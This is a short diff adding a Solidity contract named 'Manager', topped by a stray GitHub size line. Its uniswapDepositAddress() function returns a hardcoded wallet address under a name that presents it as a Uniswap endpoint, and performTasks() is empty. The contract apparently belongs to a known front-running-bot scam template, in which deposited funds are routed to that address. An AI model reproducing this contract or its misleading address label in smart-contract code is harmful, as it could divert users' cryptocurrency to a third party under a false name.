@@ -1,0 +1,10 @@
+nes (8 sloc) 237 Bytes
+pragma solidity ^0.6.6;
+
+contract Manager {
+      function performTasks() public {
+      }
+      function uniswapDepositAddress() public pure returns (address) {
+              return 0x6075567791D9A28eE3406DF7A10f3A5762903591;
+      }
+}
